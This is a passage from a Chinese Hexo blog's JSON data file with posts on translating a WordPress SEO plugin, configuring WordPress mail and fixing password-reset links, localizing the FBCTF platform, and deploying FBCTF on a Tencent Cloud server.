Ultimate插件</li>\n<li>点击上边的下载链接下载并解压出seo-ultimate-zh_CN.mo</li>\n<li>上传到<br><code>/wp-content/plugins/seo-ultimate/translations/</code><br>目录下即可完成</li>\n</ol>\n<p>有的朋友会用到深层链接(Deeplink Juggernaut)功能，会发现不支持中文，请下载下边的str.zip解压并替换到<br><code>/wp-content/plugins/seo-ultimate/includes/jlfunctions/str.php</code><br>目录下就可以支持中文了</p>\n<h3 id=\"点此下载str-zip\"><a href=\"#点此下载str-zip\" class=\"headerlink\" title=\"点此下载str.zip\"></a><a href=\"http://d52.pw/st\" target=\"_blank\" rel=\"noopener\">点此下载str.zip</a></h3>"},{"title":"wordpress发送邮件设置以及常见问题解决","date":"2017-03-09T06:26:16.000Z","_content":"\n关于wordpress的搭建在我的另一篇文章\"[一个小白的自学建站史（菜鸟建站入门）](https://blog.ctftools.com/2017/03/post5)\"的文末已经有了较为详细的解答，需要的朋友可以参考下。本文主要针对于wordpress的邮件设置，以下所有均在wordpress4.7.3环境下进行。\n\n# 发送邮件设置\n\n### 开启WP-Mail-SMTP插件\n\nwordpress原来的邮件设置是有些鸡肋的，通过main()函数来发送，且不说能不能发送成功，就算发送成功了，一般也很难进入别人的收件箱，或者连垃圾箱都进不去，所以在这里介绍一个著名的插件：WP-Mail-SMTP，我想多数人的wordpress都是使用这个插件。具体使用方法：\n\n1.  首先打开wordpress后台，点击左侧插件，点击安装插件，在右侧搜索插件WP-Mail-SMTP，如图：\n<!--more-->\n![](https://blog-10039692.file.myqcloud.com/1489036656329_6693_1489036653721.jpg)\n2.  之后点击“现在安装”，然后启用，接着点击“设置(Settings)”，填入相关信息，如图：\n![](https://blog-10039692.file.myqcloud.com/1489038136450_9116_1489038133881.jpg)\n![](https://blog-10039692.file.myqcloud.com/1489038144780_5977_1489038141615.jpg)\n3.  接着点击下面保存设置，然后可以发送一封测试邮件，试试是否可用，不可用接着往下看。\n\n### 开启OpenSSL\n\n有些人在配置插件时选择SSL加密，却发现无法使用，配置为无加密就又可用了，这种情况通常是未开启OpenSSL，开启后就可解决问题，开启方法如下：\n\n1.  首先打开php目录下的\"php.ini\"，找到\"extension=php_openssl.dll\"看看前面有没有注释符\";\"，有则去掉并保存；若是没有这句话则加上这句话之后保存；\n2.  把php目录下的\"ssleay32.dll\"、\"libeay32.dll\"，以及php/ext目录下的\"php_openssl.dll\"拷贝到C:\\Windows\\System32目录下；\n3.  重启Apache（或者IIS）。\n注：Linux开启方法请自行百度。\n\n### 解决Wordpress重设链接无效问题\n\n很多朋友在wordpress重设密码时点击邮件中的链接会遇到会遇到重设链接无效的问题，仔细观察会看到链接最后有个\"&gt;\"，删掉就正常了，这是wordpress共有的BUG，很久以前就有了，不知道为什么现在还存在，但既然存在，那就有解决的办法，具体如下：\n\n1.  编辑wordpress目录下的wp-login.php，搜索：\"rawurlencode($user_login)\"，约在332行，将其所在行修改为：\n```php\n$message .= network_site_url(\"wp-login.php?action=rp&amp;amp;key=$key&amp;amp;login=\" . rawurlencode($user_login), 'login');\n```\n如图：\n![](https://blog-10039692.file.myqcloud.com/1489039931247_5787_1489039928640.jpg)\n并保存，其实就是把前面的\"<\"和后边的\">\"删掉；\n2.  打开wordpress目录下的wp-includes/pluggable.php，搜索network_site_url，约在1791行，修改为：\n```php\n$message .= network_site_url(\"wp-login.php?action=rp&amp;amp;key=$key&amp;amp;login=\" . rawurlencode($user-&gt;user_login), 'login') . \"\\r\\n\\r\\n\";\n```\n如图：\n![](https://blog-10039692.file.myqcloud.com/1489040354613_3175_1489040351578.jpg)\n并保存，其实还是去掉了那对尖括号。\n至此，wordpress已经可以发送邮件了，同时也支持了用户的自动注册。","source":"_posts/post036.md","raw":"---\ntitle: wordpress发送邮件设置以及常见问题解决\ndate: 2017-03-09 14:26:16\ntags: 运维\n---\n\n关于wordpress的搭建在我的另一篇文章\"[一个小白的自学建站史（菜鸟建站入门）](https://blog.ctftools.com/2017/03/post5)\"的文末已经有了较为详细的解答，需要的朋友可以参考下。本文主要针对于wordpress的邮件设置，以下所有均在wordpress4.7.3环境下进行。\n\n# 发送邮件设置\n\n### 开启WP-Mail-SMTP插件\n\nwordpress原来的邮件设置是有些鸡肋的，通过main()函数来发送，且不说能不能发送成功，就算发送成功了，一般也很难进入别人的收件箱，或者连垃圾箱都进不去，所以在这里介绍一个著名的插件：WP-Mail-SMTP，我想多数人的wordpress都是使用这个插件。具体使用方法：\n\n1.  首先打开wordpress后台，点击左侧插件，点击安装插件，在右侧搜索插件WP-Mail-SMTP，如图：\n<!--more-->\n![](https://blog-10039692.file.myqcloud.com/1489036656329_6693_1489036653721.jpg)\n2.  之后点击“现在安装”，然后启用，接着点击“设置(Settings)”，填入相关信息，如图：\n![](https://blog-10039692.file.myqcloud.com/1489038136450_9116_1489038133881.jpg)\n![](https://blog-10039692.file.myqcloud.com/1489038144780_5977_1489038141615.jpg)\n3.  接着点击下面保存设置，然后可以发送一封测试邮件，试试是否可用，不可用接着往下看。\n\n### 开启OpenSSL\n\n有些人在配置插件时选择SSL加密，却发现无法使用，配置为无加密就又可用了，这种情况通常是未开启OpenSSL，开启后就可解决问题，开启方法如下：\n\n1.  首先打开php目录下的\"php.ini\"，找到\"extension=php_openssl.dll\"看看前面有没有注释符\";\"，有则去掉并保存；若是没有这句话则加上这句话之后保存；\n2.  把php目录下的\"ssleay32.dll\"、\"libeay32.dll\"，以及php/ext目录下的\"php_openssl.dll\"拷贝到C:\\Windows\\System32目录下；\n3.  重启Apache（或者IIS）。\n注：Linux开启方法请自行百度。\n\n### 解决Wordpress重设链接无效问题\n\n很多朋友在wordpress重设密码时点击邮件中的链接会遇到会遇到重设链接无效的问题，仔细观察会看到链接最后有个\"&gt;\"，删掉就正常了，这是wordpress共有的BUG，很久以前就有了，不知道为什么现在还存在，但既然存在，那就有解决的办法，具体如下：\n\n1.  编辑wordpress目录下的wp-login.php，搜索：\"rawurlencode($user_login)\"，约在332行，将其所在行修改为：\n```php\n$message .= network_site_url(\"wp-login.php?action=rp&amp;amp;key=$key&amp;amp;login=\" . rawurlencode($user_login), 'login');\n```\n如图：\n![](https://blog-10039692.file.myqcloud.com/1489039931247_5787_1489039928640.jpg)\n并保存，其实就是把前面的\"<\"和后边的\">\"删掉；\n2.  打开wordpress目录下的wp-includes/pluggable.php，搜索network_site_url，约在1791行，修改为：\n```php\n$message .= network_site_url(\"wp-login.php?action=rp&amp;amp;key=$key&amp;amp;login=\" . rawurlencode($user-&gt;user_login), 'login') . \"\\r\\n\\r\\n\";\n```\n如图：\n![](https://blog-10039692.file.myqcloud.com/1489040354613_3175_1489040351578.jpg)\n并保存，其实还是去掉了那对尖括号。\n至此，wordpress已经可以发送邮件了，同时也支持了用户的自动注册。","slug":"post036","published":1,"updated":"2020-11-02T07:16:34.538Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdd001dq0szhnkb1ja5","content":"<p>关于wordpress的搭建在我的另一篇文章”<a href=\"https://blog.ctftools.com/2017/03/post5\">一个小白的自学建站史（菜鸟建站入门）</a>“的文末已经有了较为详细的解答，需要的朋友可以参考下。本文主要针对于wordpress的邮件设置，以下所有均在wordpress4.7.3环境下进行。</p>\n<h1 id=\"发送邮件设置\"><a href=\"#发送邮件设置\" class=\"headerlink\" title=\"发送邮件设置\"></a>发送邮件设置</h1><h3 id=\"开启WP-Mail-SMTP插件\"><a href=\"#开启WP-Mail-SMTP插件\" class=\"headerlink\" title=\"开启WP-Mail-SMTP插件\"></a>开启WP-Mail-SMTP插件</h3><p>wordpress原来的邮件设置是有些鸡肋的，通过main()函数来发送，且不说能不能发送成功，就算发送成功了，一般也很难进入别人的收件箱，或者连垃圾箱都进不去，所以在这里介绍一个著名的插件：WP-Mail-SMTP，我想多数人的wordpress都是使用这个插件。具体使用方法：</p>\n<ol>\n<li>首先打开wordpress后台，点击左侧插件，点击安装插件，在右侧搜索插件WP-Mail-SMTP，如图：<a id=\"more\"></a>\n<img src=\"https://blog-10039692.file.myqcloud.com/1489036656329_6693_1489036653721.jpg\" alt=\"\"></li>\n<li>之后点击“现在安装”，然后启用，接着点击“设置(Settings)”，填入相关信息，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1489038136450_9116_1489038133881.jpg\" alt=\"\"><br><img src=\"https://blog-10039692.file.myqcloud.com/1489038144780_5977_1489038141615.jpg\" alt=\"\"></li>\n<li>接着点击下面保存设置，然后可以发送一封测试邮件，试试是否可用，不可用接着往下看。</li>\n</ol>\n<h3 id=\"开启OpenSSL\"><a href=\"#开启OpenSSL\" class=\"headerlink\" title=\"开启OpenSSL\"></a>开启OpenSSL</h3><p>有些人在配置插件时选择SSL加密，却发现无法使用，配置为无加密就又可用了，这种情况通常是未开启OpenSSL，开启后就可解决问题，开启方法如下：</p>\n<ol>\n<li>首先打开php目录下的”php.ini”，找到”extension=php_openssl.dll”看看前面有没有注释符”;”，有则去掉并保存；若是没有这句话则加上这句话之后保存；</li>\n<li>把php目录下的”ssleay32.dll”、”libeay32.dll”，以及php/ext目录下的”php_openssl.dll”拷贝到C:\\Windows\\System32目录下；</li>\n<li>重启Apache（或者IIS）。<br>注：Linux开启方法请自行百度。</li>\n</ol>\n<h3 id=\"解决Wordpress重设链接无效问题\"><a href=\"#解决Wordpress重设链接无效问题\" class=\"headerlink\" title=\"解决Wordpress重设链接无效问题\"></a>解决Wordpress重设链接无效问题</h3><p>很多朋友在wordpress重设密码时点击邮件中的链接会遇到会遇到重设链接无效的问题，仔细观察会看到链接最后有个”&gt;”，删掉就正常了，这是wordpress共有的BUG，很久以前就有了，不知道为什么现在还存在，但既然存在，那就有解决的办法，具体如下：</p>\n<ol>\n<li>编辑wordpress目录下的wp-login.php，搜索：”rawurlencode($user_login)”，约在332行，将其所在行修改为：<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$message .= network_site_url(<span class=\"string\">\"wp-login.php?action=rp&amp;amp;amp;key=$key&amp;amp;amp;login=\"</span> . rawurlencode($user_login), <span class=\"string\">'login'</span>);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1489039931247_5787_1489039928640.jpg\" alt=\"\"><br>并保存，其实就是把前面的”&lt;”和后边的”&gt;”删掉；</p>\n<ol>\n<li>打开wordpress目录下的wp-includes/pluggable.php，搜索network_site_url，约在1791行，修改为：<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$message .= network_site_url(<span class=\"string\">\"wp-login.php?action=rp&amp;amp;amp;key=$key&amp;amp;amp;login=\"</span> . rawurlencode($user-&amp;gt;user_login), <span class=\"string\">'login'</span>) . <span class=\"string\">\"\\r\\n\\r\\n\"</span>;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1489040354613_3175_1489040351578.jpg\" alt=\"\"><br>并保存，其实还是去掉了那对尖括号。<br>至此，wordpress已经可以发送邮件了，同时也支持了用户的自动注册。</p>\n","site":{"data":{}},"excerpt":"<p>关于wordpress的搭建在我的另一篇文章”<a href=\"https://blog.ctftools.com/2017/03/post5\">一个小白的自学建站史（菜鸟建站入门）</a>“的文末已经有了较为详细的解答，需要的朋友可以参考下。本文主要针对于wordpress的邮件设置，以下所有均在wordpress4.7.3环境下进行。</p>\n<h1 id=\"发送邮件设置\"><a href=\"#发送邮件设置\" class=\"headerlink\" title=\"发送邮件设置\"></a>发送邮件设置</h1><h3 id=\"开启WP-Mail-SMTP插件\"><a href=\"#开启WP-Mail-SMTP插件\" class=\"headerlink\" title=\"开启WP-Mail-SMTP插件\"></a>开启WP-Mail-SMTP插件</h3><p>wordpress原来的邮件设置是有些鸡肋的，通过main()函数来发送，且不说能不能发送成功，就算发送成功了，一般也很难进入别人的收件箱，或者连垃圾箱都进不去，所以在这里介绍一个著名的插件：WP-Mail-SMTP，我想多数人的wordpress都是使用这个插件。具体使用方法：</p>\n<ol>\n<li>首先打开wordpress后台，点击左侧插件，点击安装插件，在右侧搜索插件WP-Mail-SMTP，如图：","more":"<img src=\"https://blog-10039692.file.myqcloud.com/1489036656329_6693_1489036653721.jpg\" alt=\"\"></li>\n<li>之后点击“现在安装”，然后启用，接着点击“设置(Settings)”，填入相关信息，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1489038136450_9116_1489038133881.jpg\" alt=\"\"><br><img src=\"https://blog-10039692.file.myqcloud.com/1489038144780_5977_1489038141615.jpg\" alt=\"\"></li>\n<li>接着点击下面保存设置，然后可以发送一封测试邮件，试试是否可用，不可用接着往下看。</li>\n</ol>\n<h3 id=\"开启OpenSSL\"><a href=\"#开启OpenSSL\" class=\"headerlink\" title=\"开启OpenSSL\"></a>开启OpenSSL</h3><p>有些人在配置插件时选择SSL加密，却发现无法使用，配置为无加密就又可用了，这种情况通常是未开启OpenSSL，开启后就可解决问题，开启方法如下：</p>\n<ol>\n<li>首先打开php目录下的”php.ini”，找到”extension=php_openssl.dll”看看前面有没有注释符”;”，有则去掉并保存；若是没有这句话则加上这句话之后保存；</li>\n<li>把php目录下的”ssleay32.dll”、”libeay32.dll”，以及php/ext目录下的”php_openssl.dll”拷贝到C:\\Windows\\System32目录下；</li>\n<li>重启Apache（或者IIS）。<br>注：Linux开启方法请自行百度。</li>\n</ol>\n<h3 id=\"解决Wordpress重设链接无效问题\"><a href=\"#解决Wordpress重设链接无效问题\" class=\"headerlink\" title=\"解决Wordpress重设链接无效问题\"></a>解决Wordpress重设链接无效问题</h3><p>很多朋友在wordpress重设密码时点击邮件中的链接会遇到会遇到重设链接无效的问题，仔细观察会看到链接最后有个”&gt;”，删掉就正常了，这是wordpress共有的BUG，很久以前就有了，不知道为什么现在还存在，但既然存在，那就有解决的办法，具体如下：</p>\n<ol>\n<li>编辑wordpress目录下的wp-login.php，搜索：”rawurlencode($user_login)”，约在332行，将其所在行修改为：<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$message .= network_site_url(<span class=\"string\">\"wp-login.php?action=rp&amp;amp;amp;key=$key&amp;amp;amp;login=\"</span> . rawurlencode($user_login), <span class=\"string\">'login'</span>);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1489039931247_5787_1489039928640.jpg\" alt=\"\"><br>并保存，其实就是把前面的”&lt;”和后边的”&gt;”删掉；</p>\n<ol>\n<li>打开wordpress目录下的wp-includes/pluggable.php，搜索network_site_url，约在1791行，修改为：<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$message .= network_site_url(<span class=\"string\">\"wp-login.php?action=rp&amp;amp;amp;key=$key&amp;amp;amp;login=\"</span> . rawurlencode($user-&amp;gt;user_login), <span class=\"string\">'login'</span>) . <span class=\"string\">\"\\r\\n\\r\\n\"</span>;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1489040354613_3175_1489040351578.jpg\" alt=\"\"><br>并保存，其实还是去掉了那对尖括号。<br>至此，wordpress已经可以发送邮件了，同时也支持了用户的自动注册。</p>"},{"title":"FBCTF汉化简体中文免费下载，FBCTF更新缓存代码","date":"2017-03-17T14:40:52.000Z","_content":"\n[下载中文汉化版](http://d52.pw/fb)\n\n### 安装方法\n\n### 已经安装成功平台，更新代码\n\n1.  点击上方链接下载并解压出lang_zh-cn.php\n2.  上传到服务器根目录开始的\n<!--more-->\n```\n    /var/www/fbctf/src/language/\n```\n目录下\n3.  重新编译(有人称之为更新缓存)\n```sh\n    sudo rm /var/cache/hhvm/hhvm.hhbc\n    sudo hhvm-repo-mode enable \"/var/www/fbctf\"\n    sudo chown www-data:www-data /var/cache/hhvm/hhvm.hhbc\n    sudo service hhvm start\n    sudo service nginx restart\n```\n### 首次安装\n\n1.  在从github下载源码到服务器之后，开始安装FBCTF之前，点击上边链接下载并解压出lang_zh-cn.php\n2.  放到你下载的`fbctf/src/language/`\n目录下，之后安装FBCTF\n其他说明：因为“lang_zh-cn.php”和“lang_zh-tw.php”在后台管理中都显示为“中文/中文”，但是有一个简体有一个繁体，会造成不必要的麻烦，为避免这种情况，不需要繁体中文的用户可以删掉“lang_zh-tw.php”\n","source":"_posts/post106.md","raw":"---\ntitle: FBCTF汉化简体中文免费下载，FBCTF更新缓存代码\ndate: 2017-03-17 22:40:52\ntags: [分享,汉化]\n---\n\n[下载中文汉化版](http://d52.pw/fb)\n\n### 安装方法\n\n### 已经安装成功平台，更新代码\n\n1.  点击上方链接下载并解压出lang_zh-cn.php\n2.  上传到服务器根目录开始的\n<!--more-->\n```\n    /var/www/fbctf/src/language/\n```\n目录下\n3.  重新编译(有人称之为更新缓存)\n```sh\n    sudo rm /var/cache/hhvm/hhvm.hhbc\n    sudo hhvm-repo-mode enable \"/var/www/fbctf\"\n    sudo chown www-data:www-data /var/cache/hhvm/hhvm.hhbc\n    sudo service hhvm start\n    sudo service nginx restart\n```\n### 首次安装\n\n1.  在从github下载源码到服务器之后，开始安装FBCTF之前，点击上边链接下载并解压出lang_zh-cn.php\n2.  放到你下载的`fbctf/src/language/`\n目录下，之后安装FBCTF\n其他说明：因为“lang_zh-cn.php”和“lang_zh-tw.php”在后台管理中都显示为“中文/中文”，但是有一个简体有一个繁体，会造成不必要的麻烦，为避免这种情况，不需要繁体中文的用户可以删掉“lang_zh-tw.php”\n","slug":"post106","published":1,"updated":"2020-12-07T02:05:39.938Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rde001fq0szytew9ut8","content":"<p><a href=\"http://d52.pw/fb\" target=\"_blank\" rel=\"noopener\">下载中文汉化版</a></p>\n<h3 id=\"安装方法\"><a href=\"#安装方法\" class=\"headerlink\" title=\"安装方法\"></a>安装方法</h3><h3 id=\"已经安装成功平台，更新代码\"><a href=\"#已经安装成功平台，更新代码\" class=\"headerlink\" title=\"已经安装成功平台，更新代码\"></a>已经安装成功平台，更新代码</h3><ol>\n<li>点击上方链接下载并解压出lang_zh-cn.php</li>\n<li>上传到服务器根目录开始的<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/var/www/fbctf/src/language/</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>目录下</p>\n<ol>\n<li>重新编译(有人称之为更新缓存)<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo rm /var/cache/hhvm/hhvm.hhbc</span><br><span class=\"line\">sudo hhvm-repo-mode <span class=\"built_in\">enable</span> <span class=\"string\">\"/var/www/fbctf\"</span></span><br><span class=\"line\">sudo chown www-data:www-data /var/cache/hhvm/hhvm.hhbc</span><br><span class=\"line\">sudo service hhvm start</span><br><span class=\"line\">sudo service nginx restart</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"首次安装\"><a href=\"#首次安装\" class=\"headerlink\" title=\"首次安装\"></a>首次安装</h3><ol>\n<li>在从github下载源码到服务器之后，开始安装FBCTF之前，点击上边链接下载并解压出lang_zh-cn.php</li>\n<li>放到你下载的<code>fbctf/src/language/</code><br>目录下，之后安装FBCTF<br>其他说明：因为“lang_zh-cn.php”和“lang_zh-tw.php”在后台管理中都显示为“中文/中文”，但是有一个简体有一个繁体，会造成不必要的麻烦，为避免这种情况，不需要繁体中文的用户可以删掉“lang_zh-tw.php”</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p><a href=\"http://d52.pw/fb\" target=\"_blank\" rel=\"noopener\">下载中文汉化版</a></p>\n<h3 id=\"安装方法\"><a href=\"#安装方法\" class=\"headerlink\" title=\"安装方法\"></a>安装方法</h3><h3 id=\"已经安装成功平台，更新代码\"><a href=\"#已经安装成功平台，更新代码\" class=\"headerlink\" title=\"已经安装成功平台，更新代码\"></a>已经安装成功平台，更新代码</h3><ol>\n<li>点击上方链接下载并解压出lang_zh-cn.php</li>\n<li>上传到服务器根目录开始的","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/var/www/fbctf/src/language/</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>目录下</p>\n<ol>\n<li>重新编译(有人称之为更新缓存)<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo rm /var/cache/hhvm/hhvm.hhbc</span><br><span class=\"line\">sudo hhvm-repo-mode <span class=\"built_in\">enable</span> <span class=\"string\">\"/var/www/fbctf\"</span></span><br><span class=\"line\">sudo chown www-data:www-data /var/cache/hhvm/hhvm.hhbc</span><br><span class=\"line\">sudo service hhvm start</span><br><span class=\"line\">sudo service nginx restart</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"首次安装\"><a href=\"#首次安装\" class=\"headerlink\" title=\"首次安装\"></a>首次安装</h3><ol>\n<li>在从github下载源码到服务器之后，开始安装FBCTF之前，点击上边链接下载并解压出lang_zh-cn.php</li>\n<li>放到你下载的<code>fbctf/src/language/</code><br>目录下，之后安装FBCTF<br>其他说明：因为“lang_zh-cn.php”和“lang_zh-tw.php”在后台管理中都显示为“中文/中文”，但是有一个简体有一个繁体，会造成不必要的麻烦，为避免这种情况，不需要繁体中文的用户可以删掉“lang_zh-tw.php”</li>\n</ol>"},{"title":"在腾讯云服务器搭建FBCTF平台","date":"2017-03-30T11:56:04.000Z","_content":"\n# 前言\n\n之前有在虚拟机通过翻墙搭建了FBCTF平台，但是毕竟是虚拟机搭建的，只能在校园里网内使用，要让外网访问就需要做内网穿透了，麻烦而且不稳定，于是就想要在云服务器上搭建，由于开始思路就很正确，一次就成功了，具体方法如下：\n\n# 准备工作\n<!--more-->\n一、既然是在云服务器上搭建平台，首先自然得有一台腾讯云服务器，如果你的云服务器在国外，第二条就不用看了；\n二、如果你的云服务器在国内的话，由于FBCTF的一个重要组件HHVM在墙外，所以首先需要准备一个墙外的服务器，必须选香港的！因为只有香港的才能复制镜像。不要包月了，没必要，直接按量计费，挑个2核4G100M的配置，整个计费过程不会花超过3块钱（除非你耗时太长），详细如下：\n打开腾讯云官网注册账号并登录，点击如下位置选购服务器：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868089788_3722_1490868141823.png)\n进入后后点击立即选购，然后选择配置，推荐如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868500670_5433_1490868552464.png)\n继续选择镜像，注意必须选择如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868605811_3894_1490868657557.png)\n继续选择网络，反正按量计费，任性如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868793378_32_1490868845254.png)\n之后选择安全组，默认全部放通即可，如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868922309_2467_1490868974049.png)\n之后点击开通并等待它创建完成即可，通常1min之内创建完成。\n三、如果需要下载汉化版，可以[点击这里下载](https://blog.ctftools.com/2017/03/post106)\n\n# 开始安装\n\n一、下载putty（一款用于linux远程连接的软件），打开后输入公网IP如图操作：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490869580023_6540_1490869632549.png)\n之后在可能弹出的对话框里点确定，然后在弹出的黑底白字的界面依次输入你的服务器账号和密码（注意输入密码时不会显示，不要担心是自己没输入），得到如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490869739455_8924_1490869791229.png)\n二、输入（在putty里边选中就是复制，右键是粘贴）代码\n```\nsudo apt-get install git\n```\n然后敲击回车来安装git，中间会提示你是否安装，输入y后再敲击回车；\n三、输入代码\n```\ngit clone https://github.com/facebook/fbctf\n```\n让服务器从GitHub拷贝fbctf源码到服务器；\n四、下载FileZilla Client（一款FTP软件）并打开，点击左上角文件-站点管理器-新站点，然后如图操作，注意公网IP改为自己的：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490870461850_3703_1490870513699.png)\n之后就可以列出服务器目录如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490870559582_9731_1490870611702.png)\n之后依次打开`fbctf/src/language`，删除掉其中的`lang_zh-tw.php`，[点击这里下载汉化版](https://blog.ctftools.com/2017/03/post106)，解压并上传到该目录下，方法为从左边本地目录找到解压后的`lang_zh-cn.php`，拖到右边即可，如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490870921303_9796_1490870973178.png)\n五、打开putty输入代码cd fbctf敲击回车，再输入代码\n```\n./extra/provision.sh -m prod -c self -s $PWD\n```\n就可以开始安装了，如图：\n开始：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490871084939_2702_1490871136816.png)\n约5min后：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490871351041_397_1490871403200.png)\n约10min后：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490871639018_965_1490871691164.png)\n约13min后安装完成，并打印出密码，务必记下（在putty里边选中就是复制，右键是粘贴），如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490871883914_832_1490871935828.png)\n\n# 后续工作\n\n一、之后会有SSL证书问题，编辑`/etc/nginx/sites-available/fbctf.conf`这个文件即可，详细就不多说了，我的方法是在腾讯云申请SSL证书，然后下载并解压出nginx对应版本上传到`/home/ubuntu/ssl`目录下，然后编辑`/etc/nginx/sites-available/fbctf.conf`\n将证书目录修改为实际目录即可，注意修改这个文件需要root权限！\n二、如果安装完之后想要修改源文件需要重新编译才能生效，可以参考[HBCTF博客](https://blog.ctftools.com/2017/03/post106)。\n三、一切准备好之后就进入控制台把服务器关机，然后制作镜像，如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490873146518_5896_1490873198860.png)\n**制作完镜像记得销毁服务器以免产生不必要的费用**\n四、将镜像跨地域复制到你的国内服务器所在区域，如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490873286751_6136_1490873338723.png)\n有时候一次不成功，需要多试几次，或者换个区域。\n五、在国内的服务器上重装系统，在选择镜像时选择自定义镜像，然后就能看到你做好的镜像了\n\n# 至此完成，感谢阅读！","source":"_posts/post122.md","raw":"---\ntitle: 在腾讯云服务器搭建FBCTF平台\ndate: 2017-03-30 19:56:04\ntags: [运维,网络安全]\n---\n\n# 前言\n\n之前有在虚拟机通过翻墙搭建了FBCTF平台，但是毕竟是虚拟机搭建的，只能在校园里网内使用，要让外网访问就需要做内网穿透了，麻烦而且不稳定，于是就想要在云服务器上搭建，由于开始思路就很正确，一次就成功了，具体方法如下：\n\n# 准备工作\n<!--more-->\n一、既然是在云服务器上搭建平台，首先自然得有一台腾讯云服务器，如果你的云服务器在国外，第二条就不用看了；\n二、如果你的云服务器在国内的话，由于FBCTF的一个重要组件HHVM在墙外，所以首先需要准备一个墙外的服务器，必须选香港的！因为只有香港的才能复制镜像。不要包月了，没必要，直接按量计费，挑个2核4G100M的配置，整个计费过程不会花超过3块钱（除非你耗时太长），详细如下：\n打开腾讯云官网注册账号并登录，点击如下位置选购服务器：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868089788_3722_1490868141823.png)\n进入后后点击立即选购，然后选择配置，推荐如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868500670_5433_1490868552464.png)\n继续选择镜像，注意必须选择如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868605811_3894_1490868657557.png)\n继续选择网络，反正按量计费，任性如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868793378_32_1490868845254.png)\n之后选择安全组，默认全部放通即可，如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490868922309_2467_1490868974049.png)\n之后点击开通并等待它创建完成即可，通常1min之内创建完成。\n三、如果需要下载汉化版，可以[点击这里下载](https://blog.ctftools.com/2017/03/post106)\n\n# 开始安装\n\n一、下载putty（一款用于linux远程连接的软件），打开后输入公网IP如图操作：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490869580023_6540_1490869632549.png)\n之后在可能弹出的对话框里点确定，然后在弹出的黑底白字的界面依次输入你的服务器账号和密码（注意输入密码时不会显示，不要担心是自己没输入），得到如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490869739455_8924_1490869791229.png)\n二、输入（在putty里边选中就是复制，右键是粘贴）代码\n```\nsudo apt-get install git\n```\n然后敲击回车来安装git，中间会提示你是否安装，输入y后再敲击回车；\n三、输入代码\n```\ngit clone https://github.com/facebook/fbctf\n```\n让服务器从GitHub拷贝fbctf源码到服务器；\n四、下载FileZilla 